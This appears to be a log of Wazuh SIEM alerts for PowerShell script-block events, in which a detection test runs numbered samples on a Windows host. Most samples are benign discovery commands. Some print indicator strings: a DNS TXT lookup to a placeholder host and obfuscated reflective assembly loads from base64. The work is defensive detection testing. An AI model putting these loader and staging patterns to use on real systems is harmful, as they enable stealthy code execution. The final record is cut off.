{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1f728bc2-3f61-4a4a-8236-f61dfb156060","scriptBlockText":"$sampleId='PST-180'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723022","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-180'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1f728bc2-3f61-4a4a-8236-f61dfb156060\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:54.5598480Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:54.5598480Z\",\"eventRecordID\":\"723022\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-180'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1f728bc2-3f61-4a4a-8236-f61dfb156060\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-180'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1f728bc2-3f61-4a4a-8236-f61dfb156060\"}}}","id":"1784281014.531943","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:54.935+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"820f33ac-eedc-4e39-a8c6-1b364fa23660","scriptBlockText":"$sampleId='PST-181'; $indicator='Resolve-DnsName -Type TXT -Name ''task.example.invalid'' | Select-Object -ExpandProperty Strings'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723065","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-181'; $indicator='Resolve-DnsName -Type TXT -Name ''task.example.invalid'' | Select-Object -ExpandProperty Strings'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 820f33ac-eedc-4e39-a8c6-1b364fa23660\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:57.6777631Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:57.6777631Z\",\"eventRecordID\":\"723065\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-181'; $indicator='Resolve-DnsName -Type TXT -Name ''task.example.invalid'' | Select-Object -ExpandProperty Strings'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 820f33ac-eedc-4e39-a8c6-1b364fa23660\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-181'; $indicator='Resolve-DnsName -Type TXT -Name ''task.example.invalid'' | Select-Object -ExpandProperty Strings'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"820f33ac-eedc-4e39-a8c6-1b364fa23660\"}}}","id":"1784281018.531943","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:58.218+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"7c8ebd40-0ace-44dd-8b4d-10e04c9b3665","scriptBlockText":"$sampleId='PST-182'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723069","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-182'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 7c8ebd40-0ace-44dd-8b4d-10e04c9b3665\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:58.0136285Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:58.0136285Z\",\"eventRecordID\":\"723069\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-182'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 7c8ebd40-0ace-44dd-8b4d-10e04c9b3665\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-182'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"7c8ebd40-0ace-44dd-8b4d-10e04c9b3665\"}}}","id":"1784281018.531943","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:58.226+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c797960f-44e5-4ae1-8689-9c5a0641f1a8","scriptBlockText":"$sampleId='PST-183'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723074","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-183'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c797960f-44e5-4ae1-8689-9c5a0641f1a8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:58.3594848Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:58.3594848Z\",\"eventRecordID\":\"723074\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-183'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c797960f-44e5-4ae1-8689-9c5a0641f1a8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-183'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c797960f-44e5-4ae1-8689-9c5a0641f1a8\"}}}","id":"1784281019.534374","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":8,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:36:59.234+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e13aeb76-d4eb-4578-b3af-a0a64fcbdf86","scriptBlockText":"$sampleId='PST-184'; powercfg /L; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723089","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-184'; powercfg /L; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e13aeb76-d4eb-4578-b3af-a0a64fcbdf86\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:58.7136550Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:58.7136550Z\",\"eventRecordID\":\"723089\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-184'; powercfg /L; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e13aeb76-d4eb-4578-b3af-a0a64fcbdf86\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-184'; powercfg /L; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e13aeb76-d4eb-4578-b3af-a0a64fcbdf86\"}}}","id":"1784281019.534374","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:59.445+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b3b7be8e-d7b4-419e-afd6-90d27175071c","scriptBlockText":"$sampleId='PST-185'; $indicator='[Reflectio' + 'n.Assembly' + ']::Load(' + '[Conv' + 'ert]::FromB' + 'ase64St' + 'ring(''VE' + 'hFU0lTL' + 'UlORVJUL' + 'URVTU1Z' + '''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723091","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-185'; $indicator='[Reflectio' + 'n.Assembly' + ']::Load(' + '[Conv' + 'ert]::FromB' + 'ase64St' + 'ring(''VE' + 'hFU0lTL' + 'UlORVJUL' + 'URVTU1Z' + '''))'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b3b7be8e-d7b4-419e-afd6-90d27175071c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:59.0657977Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:59.0657977Z\",\"eventRecordID\":\"723091\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-185'; $indicator='[Reflectio' + 'n.Assembly' + ']::Load(' + '[Conv' + 'ert]::FromB' + 'ase64St' + 'ring(''VE' + 'hFU0lTL' + 'UlORVJUL' + 'URVTU1Z' + '''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b3b7be8e-d7b4-419e-afd6-90d27175071c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-185'; $indicator='[Reflectio' + 'n.Assembly' + ']::Load(' + '[Conv' + 'ert]::FromB' + 'ase64St' + 'ring(''VE' + 'hFU0lTL' + 'UlORVJUL' + 'URVTU1Z' + '''))'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b3b7be8e-d7b4-419e-afd6-90d27175071c\"}}}","id":"1784281019.534374","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:59.477+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f68b17d9-4aad-454b-9304-10c056b706d1","scriptBlockText":"$sampleId='PST-186'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723093","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-186'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f68b17d9-4aad-454b-9304-10c056b706d1\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:59.3829476Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:59.3829476Z\",\"eventRecordID\":\"723093\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-186'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f68b17d9-4aad-454b-9304-10c056b706d1\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-186'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f68b17d9-4aad-454b-9304-10c056b706d1\"}}}","id":"1784281020.534374","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:00.398+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"05fa3f07-3ce1-42d9-9ecd-7636b9f33460","scriptBlockText":"$sampleId='PST-187'; $indicator='[Reflect`ion.Assembly]::Load([Conv`ert]::Fr`omBase64Stri`ng(''VEhFU0lTLUlORVJ`U`LURVTU1Z''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723099","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-187'; $indicator='[Reflect`ion.Assembly]::Load([Conv`ert]::Fr`omBase64Stri`ng(''VEhFU0lTLUlORVJ`U`LURVTU1Z''))'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 05fa3f07-3ce1-42d9-9ecd-7636b9f33460\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:59.7752093Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:59.7752093Z\",\"eventRecordID\":\"723099\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-187'; $indicator='[Reflect`ion.Assembly]::Load([Conv`ert]::Fr`omBase64Stri`ng(''VEhFU0lTLUlORVJ`U`LURVTU1Z''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 05fa3f07-3ce1-42d9-9ecd-7636b9f33460\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-187'; $indicator='[Reflect`ion.Assembly]::Load([Conv`ert]::Fr`omBase64Stri`ng(''VEhFU0lTLUlORVJ`U`LURVTU1Z''))'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"05fa3f07-3ce1-42d9-9ecd-7636b9f33460\"}}}","id":"1784281020.534374","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:00.412+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"0bdf2680-187a-4547-a12e-e66267c8db08","scriptBlockText":"$sampleId='PST-188'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723103","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-188'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 0bdf2680-187a-4547-a12e-e66267c8db08\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:00.0999728Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:00.0999728Z\",\"eventRecordID\":\"723103\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-188'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 0bdf2680-187a-4547-a12e-e66267c8db08\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-188'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"0bdf2680-187a-4547-a12e-e66267c8db08\"}}}","id":"1784281020.534374","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:00.427+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c316a970-099a-445b-9a26-d60e77560563","scriptBlockText":"$sampleId='PST-189'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723170","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-189'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c316a970-099a-445b-9a26-d60e77560563\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:05.1294130Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:05.1294130Z\",\"eventRecordID\":\"723170\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-189'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c316a970-099a-445b-9a26-d60e77560563\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-189'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c316a970-099a-445b-9a26-d60e77560563\"}}}","id":"1784281026.534374","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:06.117+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"19efc387-33f1-477a-b64c-335091f3cf19","scriptBlockText":"$sampleId='PST-190'; $result=&amp; { Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id }; $result | Out-String | Write-Output; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723184","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-190'; $result=& { Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id }; $result | Out-String | Write-Output; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 19efc387-33f1-477a-b64c-335091f3cf19\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:05.4693265Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:05.4693265Z\",\"eventRecordID\":\"723184\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-190'; $result=& { Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id }; $result | Out-String | Write-Output; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 